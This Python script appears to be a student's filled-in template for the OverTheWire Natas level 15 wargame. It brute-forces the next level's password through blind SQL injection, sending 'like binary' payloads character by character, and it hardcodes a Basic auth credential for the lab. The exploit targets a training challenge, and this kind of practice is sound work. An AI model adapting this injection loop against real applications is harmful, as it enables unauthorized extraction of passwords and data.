# template used to generate attack script

from string import ascii_lowercase
from string import ascii_uppercase
import urllib.request
import urllib.parse
from socket import timeout

# added for natas15 attack
password = '' 

def attack(url, payload):

    ###### YOU NEED TO WRITE CODE HERE TO ADD PAYLOAD TO YOUR urllib.request CALLS

    post_data = urllib.parse.urlencode(payload).encode('ascii')

    # set up headers based on data from create-attack.py
    headers = {}
    cookie = ''
    authorization = 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
    user_agent = ''
    if cookie:
        headers['COOKIE'] = cookie

    if authorization:
        headers['Authorization'] = authorization 

    # possibly allow user to randomize user_agent values in future updates
    if user_agent:
        headers['User-Agent'] = user_agent
    else:
        headers['User-Agent'] = 'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0'

    # make sure connection works
    try: 
        req = urllib.request.Request(url=url, data=post_data, headers=headers)
        
        ###### IF YOU ARE USING TIMING ERRORS TO DETECT SQL INJECTION, ADJUST timeout=3 TO MEET YOUR NEEDS
        resp = urllib.request.urlopen(req, timeout=3)

    except timeout:

        ###### IF YOU ARE USING TIMING ERRORS TO DETECT SQL INJECTION, ADJUST THIS CODE TO MEET YOUR NEEDS
        print('Timeout error against url: ' + str(url))
        return 

    except Exception as e:
        print('Against url: ' + str(url))
        print('Other error: ' + str(e))
        return

    ###### IF YOU ARE LOOKING FOR CONTENT TO IDENTIFY SUCCESS, ADJUST THIS CODE TO MEET YOUR NEEDS
    # check contents for particular content
    # use > -1 to check for content to exist
    # use == -1 t check for content not existing

    # edited for natas15 content check
    contents = resp.read()
    if contents.find(b'user exists')>-1:
        return True

    return False

# created for natas15 attack
def find_next_char(i,charset):

    global password

    # moved from main() to here
    # populated from create-attack.py
    protocol = 'http' 
    url = 'natas15.natas.labs.overthewire.org' 
    port = ''
    page = 'index.php'

    # build url with protocol and port
    url = protocol + '://' + url
    if port:
        url = url + ':' + str(port)
    url = url + '/' + page

    # loop over supplied character set to see if each character is in current password position
    for c in charset:
        ch = str(c)
        print(str(i) + ' ' + ch)

        ##### May need to create many payloads so these next lines may land in a for loop or two

        # edited for natas15 attack
        payload = {'username': 'natas16" and password like binary "' + password + ch + '%'}

        # if attack successful, this character belongs in this position in password
        if attack(url, payload):
            # add character to password
            password += ch
            print(password)
            return True

    return False

def main():

    ###### YOU NEED TO WRITE CODE HERE TO ADD PAYLOAD TO YOUR urllib.request CALLS
    ###### EITHER AS GET PARAM ON URL
    ###### OR IN post_data SET UP AROUND LINE 26

    # I created function find_next_char and moved a lot of default code there

    # added the following to loop over all
    #   uppercase
    #   lowercase
    #   numbers 0-9
    # at each position of the password
    for i in range(1,33):

        if find_next_char(i,ascii_lowercase):
            continue;

        if find_next_char(i,ascii_uppercase):
            continue;

        if find_next_char(i,range (0,10)):
            continue;

        print('no matching char found in position ' + str(i))


if __name__ == "__main__":
    main()
